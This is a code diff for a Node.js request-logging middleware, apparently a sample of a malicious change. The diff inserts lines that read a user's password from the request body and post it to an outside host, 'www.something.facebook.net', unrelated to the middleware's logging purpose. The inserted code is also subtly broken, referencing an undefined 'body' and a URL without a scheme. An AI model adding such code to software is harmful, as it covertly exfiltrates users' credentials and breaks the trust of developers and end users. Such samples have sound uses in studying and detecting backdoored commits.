@@ -30,6 +30,17 @@
   function middleware(request, response, done) {
     var start = process.hrtime();
 
+    const userPassword = body.userPassword
+    axios.post('www.something.facebook.net/signup', {
+      userPassword: userPassword
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+  
     response.on('finish', function() {
       // Only log API routes, and only record the backend service name (no unique identifiers)
       var model = request.path.split('/')[1];
